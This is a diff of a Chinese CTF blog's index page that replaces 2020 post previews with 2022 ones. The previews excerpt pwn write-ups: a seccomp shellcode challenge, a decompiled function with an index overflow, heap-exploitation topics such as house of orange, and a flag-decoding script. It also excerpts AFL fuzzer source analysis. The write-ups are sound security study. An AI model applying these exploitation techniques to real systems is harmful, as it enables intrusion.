@@ -292,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/kernel pwn 环境搭建/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/pwnable.kr 之 asm/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -311,7 +311,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/21/kernel pwn 环境搭建/" itemprop="url">kernel pwn 环境搭建</a></h1>
+                <a class="post-title-link" href="/2022/02/14/pwnable.kr 之 asm/" itemprop="url">pwnablr.kr 之 asm</a></h1>
         
 
         <div class="post-meta">
@@ -323,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
               </time>
             
 
@@ -384,10 +384,11 @@
 
       
         
-          <h3 id="编译生成内核镜像"><a href="#编译生成内核镜像" class="headerlink" title="编译生成内核镜像"></a>编译生成内核镜像</h3><p>先下载一个内核源码 ：<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/</a><br>我下载的是linux-4.9.tar.gz<br>然后安装一些依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc</span><br></pre></td></tr></table></figure></p>
+          <p>用了沙箱，只开启了，open,read,write,exit，4个函数，并且在执行我们的shellcode前还清空了所有寄存器，但是这不影响，照常写shellcode。只是这flag的名字嘛，真长！</p>
+<p>可以用pwntools，shellcraft模块</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/kernel pwn 环境搭建/#more" rel="contents">
+            <a class="btn" href="/2022/02/14/pwnable.kr 之 asm/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -438,7 +439,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/i春秋新春战役/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/2021 pwnhub【11月公开赛】/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -457,7 +458,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/21/i春秋新春战役/" itemprop="url">2020年i春秋新春战役之 pwn 题解</a></h1>
+                <a class="post-title-link" href="/2022/02/14/2021 pwnhub【11月公开赛】/" itemprop="url">pwnhub[11月公开赛] pwn2</a></h1>
         
 
         <div class="post-meta">
@@ -469,8 +470,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
               </time>
             
 
@@ -530,12 +531,11 @@
 
       
         
-          <h2 id="2-21-–-BFnote"><a href="#2-21-–-BFnote" class="headerlink" title="2-21 – BFnote"></a>2-21 – BFnote</h2><p>这题很秀，我觉得有必要记录下来</p>
-<p>简单分析一下程序不难发现程序存在很明显的栈溢出，但是因为开启了canary，得想办法绕过；还有在malloc(size)的时候，size大小不限</p>
-<p><strong>不仔细看还发现不了，下方还存在一个下标溢出，v4一开始被初始化后，在循环中只有i被重新赋值，而v4在后面又用到了</strong></p>
+          <h3 id="先说漏洞"><a href="#先说漏洞" class="headerlink" title="先说漏洞"></a>先说漏洞</h3><p>edit函数中存在下标溢出，刚好能覆盖到chunk[0]</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">17</span> || !*qword_4050[idx].chunk ) <span class="comment">//idx=17时，溢出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"nonono"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"conttent:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, *qword_4050[idx].chunk, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/i春秋新春战役/#more" rel="contents">
+            <a class="btn" href="/2022/02/14/2021 pwnhub【11月公开赛】/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -586,7 +586,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/ISCC的pwn02/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/2021广东省强网杯/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -605,7 +605,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/21/ISCC的pwn02/" itemprop="url">ISCC的pwn02</a></h1>
+                <a class="post-title-link" href="/2022/02/14/2021广东省强网杯/" itemprop="url">2021广东省强网杯</a></h1>
         
 
         <div class="post-meta">
@@ -617,305 +617,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/堆/" itemprop="url" rel="index">
-                    <span itemprop="name">堆</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">   RELRO:    No RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-<p>保护只开启了NX，程序有3个功能：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、malloc + get</span><br><span class="line">2、free</span><br><span class="line">3、puts</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/ISCC的pwn02/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/how2heap系列/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="R4bb1t">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R4bb1t的ctf博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/06/21/how2heap系列/" itemprop="url">hctf2016-fheap</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/堆/" itemprop="url" rel="index">
-                    <span itemprop="name">堆</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><p>程序只有两个功能：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>create <span class="built_in">string</span></span><br><span class="line"><span class="number">2.</span><span class="keyword">delete</span> <span class="built_in">string</span></span><br></pre></td></tr></table></figure>
-<h3 id="1、create-功能"><a href="#1、create-功能" class="headerlink" title="1、create 功能"></a>1、create 功能</h3><p><img src="\images\堆\4.jpg" alt></p>
-<p>先申请一个0x20大小的
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/how2heap系列/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </p></div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/house of orange/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="R4bb1t">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R4bb1t的ctf博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/06/21/house of orange/" itemprop="url">house of orange 学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
               </time>
             
 
@@ -975,11 +678,12 @@
 
       
         
-          <p>大名鼎鼎 house of orange来自于Hitcon CTF 2016中的一道 同名题目，其可以在没有free的情况下得到一块unsorted bin，因为unsorted bin的fd,bk为main_arean+88，所以可以通过申请切割unsorted bin来泄漏libc地址（没有深入了解的我一直以为这是house of orange仅此而已的用处……汗……）</p>
-<h2 id="House-of-orange-–-2016Hitcon-CTF"><a href="#House-of-orange-–-2016Hitcon-CTF" class="headerlink" title="House_of_orange – 2016Hitcon CTF"></a>House_of_orange – 2016Hitcon CTF</h2><p>题目逻辑很简单，一共可以build 4次，每次build分进行3次堆分配，两次malloc，一次calloc，其中一次malloc是固定的0x10字节作为控制堆块，放着name和color的信息，另外按输入分配name 的大小。</p>
+          <h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><p>程序中存在许多花指令，但是都是一样的类型</p>
+<p><img src="\images\2021广东省强网杯\1.jpg" alt="1"></p>
+<p>妨碍反编译，先去花</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/house of orange/#more" rel="contents">
+            <a class="btn" href="/2022/02/14/2021广东省强网杯/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1030,7 +734,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/Hitcon-Training(下)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/2021 pwnhub【迎中秋】公开赛/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -1049,7 +753,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/21/Hitcon-Training(下)/" itemprop="url">Hitcon-Training lab10~lab15</a></h1>
+                <a class="post-title-link" href="/2022/02/14/2021 pwnhub【迎中秋】公开赛/" itemprop="url">2021 pwnhub【迎中秋】公开赛</a></h1>
         
 
         <div class="post-meta">
@@ -1061,159 +765,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/堆/" itemprop="url" rel="index">
-                    <span itemprop="name">堆</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="lab10"><a href="#lab10" class="headerlink" title="lab10"></a>lab10</h2><p>这一题开始就是堆的范畴了</p>
-<h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>程序只开启了NX保护</p>
-<p><img src="\images\堆\14.jpg" alt></p>
-<p>有三个功能，分别是add，delete跟print</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line"> <span class="number">1.</span> Add note          </span><br><span class="line"> <span class="number">2.</span> Delete note       </span><br><span class="line"> <span class="number">3.</span> Print note        </span><br><span class="line"> <span class="number">4.</span> Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>
-<p>先一看一下add:</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/Hitcon-Training(下)/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/Hitcon-Training(上)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="R4bb1t">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R4bb1t的ctf博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/06/21/Hitcon-Training(上)/" itemprop="url">Hitcon-Training lab1~lab9</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
               </time>
             
 
@@ -1273,14 +826,11 @@
 
       
         
-          <h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><p>方法1：逆向破解，因为题目给了.c文件，里面有key和cipher可以直接用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">"Do_you_know_why_my_teammate_Orange_is_so_angry???"</span></span><br><span class="line">cipher = [<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	flag += chr(cipher[i]^ord(key[i]))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
-<p>方法2：利用gdb动态调试，可以在已生成password且未输入magic的情况下获得password的值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在0x80486e7处下断点，可以看到ebp - 0x80就是password存放的地方</span><br><span class="line">► 0x80486e7 &lt;get_flag+332&gt;    lea    eax, [ebp - 0x80]</span><br><span class="line">  0x80486ea &lt;get_flag+335&gt;    push   eax</span><br><span class="line">  0x80486eb &lt;get_flag+336&gt;    push   dword ptr [ebp - 0x74]</span><br><span class="line">  0x80486ee &lt;get_flag+339&gt;    call   read@plt &lt;0x8048410&gt;</span><br><span class="line">再运行到0x8048712处，可以查看 ebp - 0x80的值 </span><br><span class="line">pwndbg&gt; x/wx ($ebp -0x80)</span><br><span class="line">0xffffcd08:	0x4f77e43c</span><br><span class="line">转成十进制，输入就能得到flag</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">1333257276  </span><br><span class="line">CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;[Inferior 1 (process 7593) exited normally]</span><br></pre></td></tr></table></figure></p>
-<p>方法3：<br>同样利用gdb调试，但是这次不用获取password的值而直接在if跳转前设置eip的值指向flag输出的for 循环即可</p>
-<p><img src="\images\hitcon-training\1.png" alt="image.png"></p>
-<p><img src="\images\hitcon-training\2.png" alt="image.png"></p>
+          <h2 id="moregirlfriend"><a href="#moregirlfriend" class="headerlink" title="moregirlfriend"></a>moregirlfriend</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>glibc 2.31版本，开启沙箱禁用了execve，saygoodbye功能是一个其中释放堆的操作，漏洞就在这个函数中</p>
+<p><img src="\images\pwnhub\4.jpg" alt="4"></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/06/21/Hitcon-Training(上)/#more" rel="contents">
+            <a class="btn" href="/2022/02/14/2021 pwnhub【迎中秋】公开赛/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1331,7 +881,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/hfctf/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/AFL源码分析计划1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -1350,7 +900,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/21/hfctf/" itemprop="url">虎符ctf部分pwn题解</a></h1>
+                <a class="post-title-link" href="/2022/02/14/AFL源码分析计划1/" itemprop="url">AFL源码分析计划1 -- afl-gcc.c</a></h1>
         
 
         <div class="post-meta">
@@ -1362,8 +912,451 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
-                2020-06-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuzz/" itemprop="url" rel="index">
+                    <span itemprop="name">fuzz</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>从main函数开始，可以看到主要就这三行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find_as(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line">execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2022/02/14/AFL源码分析计划1/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/AFL源码分析计划2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4bb1t">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4bb1t的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/02/14/AFL源码分析计划2/" itemprop="url">AFL源码分析计划2 -- afl-as.c</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuzz/" itemprop="url" rel="index">
+                    <span itemprop="name">fuzz</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>从main函数开始</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u8* inst_ratio_str = getenv(<span class="string">"AFL_INST_RATIO"</span>);</span><br></pre></td></tr></table></figure>
+<p>先是从环境变量中拿了<code>AFL_INST_RATIO</code>，这是插入指令的密度</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2022/02/14/AFL源码分析计划2/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/14/AFL源码分析计划3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4bb1t">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4bb1t的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/02/14/AFL源码分析计划3/" itemprop="url">AFL源码分析计划3 -- afl-as.h</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-14T15:35:59+08:00">
+                2022-02-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuzz/" itemprop="url" rel="index">
+                    <span itemprop="name">fuzz</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>这个头文件里面放着的是汇编器编译汇编到二进制时插入的汇编代码。</p>
+<p>这里只分析64位的</p>
